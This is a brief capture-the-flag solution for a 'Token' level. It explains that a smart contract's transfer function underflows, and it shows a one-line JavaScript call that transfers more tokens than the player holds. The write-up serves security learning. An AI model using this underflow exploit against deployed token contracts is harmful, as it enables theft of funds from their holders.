# Level 5 - Token

As explained in the blog post, the exploit lies within the possible overflow. It's sufficient to call the transfer function with a value greater than your current balance (which is 20 in the beginning).

```js
await contract.transfer(player, 21);
```
